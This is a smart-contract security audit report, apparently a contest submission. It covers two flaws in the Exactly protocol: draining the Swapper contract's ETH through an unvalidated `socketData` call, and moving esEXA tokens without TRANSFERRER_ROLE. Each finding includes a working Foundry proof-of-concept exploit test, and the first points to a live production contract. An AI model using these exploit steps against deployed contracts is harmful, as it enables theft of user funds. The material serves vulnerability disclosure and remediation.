## H1 - ETH balance from Swapper contract can be stolen

## Summary
Users can erroneously send ETH to Swapper contract and due to a lack of validation of the parameter `socketData` in `Swapper::swap` it can be manipulated to exchange Swapper Contract ETH balance for EXA and send to the attacker.


## Vulnerability Detail
 `Swapper::swap` use the SocketGateway to swap any token for ETH and then use the ETH to swap it for EXA. In order to perform the swap in SocketGateway a non validated parameter named `socketData`  is applied to `socket::functionCall` that should return the 
 result (uint256) of the swap but really any method of SocketGateway can be called and therefore exist an attack path to steal the ETH Contract balance and swap for EXA and send to the attacker.

### Atack path

Attacker Steal Swapper ETH balance

1. Victim erroneously send ETH to Swapper contract because receive function doesn't have any validation, at the moment of creating the report the balance is 0.001922998074009663 ether
2. Attacker instead of using the socketData to swap tokens, it select a method of SocketGateway the returns a uint256 less that the balance. for example `SocketGateway::routesCount`
3. `SocketGateway::routesCount` will return an uint256 but is not the result of the swap, it is a number that the contract will use to erroneously swap the ETH balance for EXA and send to the attacker
4. Then repeat (2) and (3) until steal all ETH of the contract

### Proof of Concept
Paste this POC to Swapper.t.sol

add import:

```javascript
import "forge-std/console2.sol";
```

```javascript

  function testBlackhatCanStealContractETH() external {
    uint256 amount = 0;

    address blackhat = address(1001);
    address victim = address(1002);
    vm.label(blackhat, "blackhat");
    vm.label(victim, "victim");

    // fund the victim just it can operate
    address(victim).call{value: 1 ether}("");

    assertEq(exa.balanceOf(blackhat), 0, "Blackhat should start with 0 balance of EXA");
    assertEq(address(swapper).balance, 0, "Swapper ETH should be 0 but then will get eth");

    // Victims might inadvertently send ETH to the Swapper contract, as the receive function lacks of validations.
    // At the moment Swapper Proxy has 0.001922998074009663 ETH (6.08 USD) so i deposit that amount
    // Send eth to the contract
    uint256 initialValue = 0.001922998074009663 ether;
    vm.prank(victim);
    // Victim send ETH to Swapper contract erroneously
    address(swapper).call{value: initialValue}("");

    assertEq(address(swapper).balance, initialValue, "Swapper ETH should be what the vvictim send");

    uint256 balanceBeforeAttack = address(swapper).balance;
    console2.log("Swapper Balance: %d, blackhat balance", balanceBeforeAttack, exa.balanceOf(blackhat));

    
    (bool success, bytes memory data) = address(deployment("SocketGateway")).call(
            abi.encodeWithSignature("routesCount()")
        );
    
    uint256 routesCount = abi.decode(data, (uint256));

    // The attack consist that instead of calling the swap, the attacker can call any method that return a uint256 
    // less that the available ETH in the Swapper contract 
    vm.prank(blackhat);
    swapper.swap(
      op,
      amount,
      hex"fd326921", //abi.encode of SocketGateway::routesCount
      0,
      0
    );

    uint256 balanceAfterAttack = address(swapper).balance;
    console2.log("Swapper after attack Balance: %d blackhat balance", balanceAfterAttack, exa.balanceOf(blackhat));

    assertEq(address(swapper).balance, initialValue - routesCount, "Swapper ETH should be what the vvictim send minus stolen");
    assertGt(exa.balanceOf(blackhat), 0, "Blackhat should receive EXA in exchange for the eth of swapper");
  }


```


## Impact

Loss of funds. Attacker can steal the ETH balance of the Swapper contract that is incremented when users erroneously send ETH to it because `Swapper::receive` is without validation.
At the moment 0.001922998074009663 ether can be stolen and Swaper seems to be in [production](https://optimistic.etherscan.io/address/0x0E7eb3fEEAe852126DEc868505961a0a43823b6B)

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model-nfmelendez/blob/main/protocol/contracts/periphery/Swapper.sol#L76

https://github.com/sherlock-audit/2024-04-interest-rate-model-nfmelendez/blob/main/protocol/contracts/periphery/Swapper.sol#L135


## Tool used

Manual Review

## Recommendation

Validate and restrict `socketData` in `Swapper::swap` using  `socketData(data[:4])` and keccak256 to verify that the method that is going to be executed is a swap of the third-party that exactly want to work and then also validate it parameters using abi.decode.
[ZivoeSwapper](https://github.com/Zivoe/zivoe-core-foundry/blob/ad27cffdf96eaaa33274bfba0dda9b60e36d29a2/src/lockers/Utility/ZivoeSwapper.sol) is a great examplee of how to do it.

Swapper.sol is out of the contest scope so it is an INFO but Sponsor should take inmediate action. 




## M1 - Any address without TRANSFERRER_ROLE can transfer esEXA tokens.

## Summary
 
 Only addresses with TRANSFERRER_ROLE can transfer esEXA tokens but ANY address can transfer esEXA to another using a combination of
`esEXA::vest`, `sablier::transferFrom` and `esEXA::cancel` because when vesting the `EscrowedEXA.sol` contract creates a sablier token stream with `transaferable=true` property by default.


## Vulnerability Detail

When a user vests esEXA tokens a sablier token stream is automatically created with the `transferable=true` property. If the user cancel right after initiating the vesting, the esEXA tokens are then transferred to the intended recipient. However, due to the stream's transferable nature, the recipient of the stream can be altered. Consequently, this new recipient can receive the esEXA tokens upon cancellation, thereby circumventing the controls established by the TRANSFERRER_ROLE.

### Atack path

Mark can transfer esEXA to Sam doing

1. Mark vest an amount of esEXA using `esEXA::Vest`
2. Mark just after vesting transfer the token stream to Sam using `sablier::transferFrom`
3. Sam now calls `esEXA::cancel` and get the esEXA token.

### Proof of Concept
Paste this POC to EscrowedEXA.t.sol

add import:

```javascript
import "forge-std/console2.sol";
```

```javascript

  function testTransferEsEXAWithoutTransferRole() external {
    uint256 amount = 1_000 ether;
    uint256 ratio = esEXA.reserveRatio();
    uint256 reserve = amount.mulWadDown(ratio);

    address sam = address(1001);
    address mark = address(1002);

    vm.label(sam, "sam");
    vm.label(mark, "mark");

    esEXA.mint(amount, sam);
    exa.transfer(sam, reserve);

    uint256[] memory streams = new uint256[](1);

    console2.log("EsEXA balance AFTER mark: %d , sam: %d", esEXA.balanceOf(mark), esEXA.balanceOf(sam));
    assertTrue(!esEXA.hasRole(esEXA.TRANSFERRER_ROLE(), mark));
    assertTrue(!esEXA.hasRole(esEXA.TRANSFERRER_ROLE(), sam));
    assertEq(esEXA.balanceOf(sam), amount);
    assertEq(esEXA.balanceOf(mark), 0);

    vm.startPrank(sam);
    exa.approve(address(esEXA), reserve);
    // mark will vest amount of esEXA
    streams[0] = esEXA.vest(uint128(amount), sam, ratio, esEXA.vestingPeriod());
    // Since the stream is set transferable when created and it is a NFT can be transfered to another person(mark).
    address(sablier).call(
                abi.encodeWithSignature("transferFrom(address,address,uint256)", sam, mark, streams[0])
            );
    vm.stopPrank();

    vm.prank(mark);
    
    // mark cancel the stream and get the esEXA. 
    esEXA.cancel(streams);

    console2.log("EsEXA balance BEFORE mark: %d , sam: %d", esEXA.balanceOf(mark), esEXA.balanceOf(sam));

    assertTrue(!esEXA.hasRole(esEXA.TRANSFERRER_ROLE(), mark));
    assertTrue(!esEXA.hasRole(esEXA.TRANSFERRER_ROLE(), sam));
    assertEq(esEXA.balanceOf(sam), 0);
    // Mark got the esEXA from sam without having TRANSFERRER_ROLE using a combination of esEXA::vest, sablier::transferFrom and esEXA::cancel
    assertEq(esEXA.balanceOf(mark), amount);

  }

```



## Impact
TRANSFERRER_ROLE Access Control bypass break important assumptions that protocol contracts do as the [exactly documentation says:](https://docs.exact.ly/governance/exactly-token-exa/escrowedexa-esexa)

```
The esEXA tokens are only transferable for accounts with a TRANSFERER_ROLE, reserved for the protocol contracts to integrate smoothly.
```

## Code Snippet

https://github.com/sherlock-audit/2024-04-interest-rate-model-nfmelendez/blob/main/protocol/contracts/periphery/EscrowedEXA.sol#L58-L62

https://github.com/sherlock-audit/2024-04-interest-rate-model-nfmelendez/blob/main/protocol/contracts/periphery/EscrowedEXA.sol#L96-L107


## Tool used

Manual Review

## Recommendation

Only addresses with TRANSFERRER_ROLE should create `transaferable=true` token stream and all others addresses should create non transferable stream.